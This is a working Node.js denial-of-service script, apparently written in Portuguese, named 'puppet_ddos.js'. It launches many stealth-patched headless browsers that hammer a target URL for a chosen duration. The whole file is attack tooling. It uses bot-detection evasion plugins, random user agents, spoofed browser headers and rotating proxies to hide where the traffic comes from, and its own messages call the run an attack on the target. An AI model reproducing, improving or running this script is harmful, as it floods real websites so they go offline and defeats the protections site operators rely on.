const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const AnonymizeUAPlugin = require('puppeteer-extra-plugin-anonymize-ua');

puppeteer.use(StealthPlugin());
puppeteer.use(AnonymizeUAPlugin());

// ===== CONFIGURAÇÃO =====
const args = process.argv.slice(2);
if (args.length < 3) {
    console.log(`
Uso: node puppet_ddos.js <target> <duration> <workers> [--headless] [--proxy-file proxies.txt]
  <target>      URL alvo (ex: https://example.com)
  <duration>    Tempo de ataque em segundos
  <workers>     Número de páginas/browsers simultâneos
  --headless    Executa em modo headless (recomendado)
  --proxy-file  Arquivo com proxies (um por linha, formato ip:port)
`);
    process.exit(1);
}

const target = args[0];
const duration = parseInt(args[1]);
const workers = parseInt(args[2]);
const headless = args.includes('--headless');
const proxyFileIndex = args.indexOf('--proxy-file');
let proxies = [];
if (proxyFileIndex !== -1 && args[proxyFileIndex + 1]) {
    const fs = require('fs');
    try {
        proxies = fs.readFileSync(args[proxyFileIndex + 1], 'utf-8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line);
        console.log(`[INFO] Carregados ${proxies.length} proxies.`);
    } catch (err) {
        console.error(`[ERRO] Não foi possível ler o arquivo de proxies: ${err.message}`);
        process.exit(1);
    }
}

// ===== FUNÇÃO DE ATAQUE =====
async function attackWorker(workerId) {
    let browser = null;
    try {
        // Configuração do proxy (se houver)
        let proxyArg = [];
        if (proxies.length > 0) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            proxyArg = [`--proxy-server=${proxy}`];
            console.log(`[Worker ${workerId}] Usando proxy: ${proxy}`);
        }

        const browserOptions = {
            headless: headless ? 'new' : false,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '--disable-features=site-per-process',
                '--ignore-certificate-errors',
                ...proxyArg
            ],
            ignoreHTTPSErrors: true,
        };

        browser = await puppeteer.launch(browserOptions);
        const page = await browser.newPage();

        // Define um User‑Agent aleatório
        const uaList = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
        ];
        const randomUA = uaList[Math.floor(Math.random() * uaList.length)];
        await page.setUserAgent(randomUA);
        await page.setViewport({ width: 1920, height: 1080 });

        // Headers adicionais para parecer um navegador real
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        });

        console.log(`[Worker ${workerId}] Iniciando...`);

        const startTime = Date.now();
        let requestCount = 0;

        // Função para realizar uma requisição
        async function sendRequest() {
            try {
                const response = await page.goto(target, {
                    waitUntil: 'domcontentloaded',
                    timeout: 10000
                });
                if (response) {
                    requestCount++;
                    const status = response.status();
                    // Log a cada 10 requisições
                    if (requestCount % 10 === 0) {
                        console.log(`[Worker ${workerId}] Requisições: ${requestCount} | Status: ${status}`);
                    }
                }
            } catch (err) {
                // Ignora erros (timeout, conexão recusada, etc.)
                requestCount++;
            }
        }

        // Loop de requisições até o tempo expirar
        while (Date.now() - startTime < duration * 1000) {
            await sendRequest();
            // Pequena pausa para evitar sobrecarga da CPU (opcional)
            await new Promise(r => setTimeout(r, 10));
        }

        console.log(`[Worker ${workerId}] Finalizado. Total de requisições: ${requestCount}`);
    } catch (err) {
        console.error(`[Worker ${workerId}] Erro: ${err.message}`);
    } finally {
        if (browser) await browser.close();
    }
}

// ===== INÍCIO DO ATAQUE =====
console.log(`[INFO] Iniciando ataque contra ${target} com ${workers} workers por ${duration}s...`);

// Lança todos os workers em paralelo
const workerPromises = [];
for (let i = 0; i < workers; i++) {
    workerPromises.push(attackWorker(i + 1));
}

Promise.all(workerPromises).then(() => {
    console.log('[INFO] Todos os workers finalizaram. Ataque concluído.');
}).catch(err => {
    console.error('[ERRO] Ataque interrompido:', err);
});
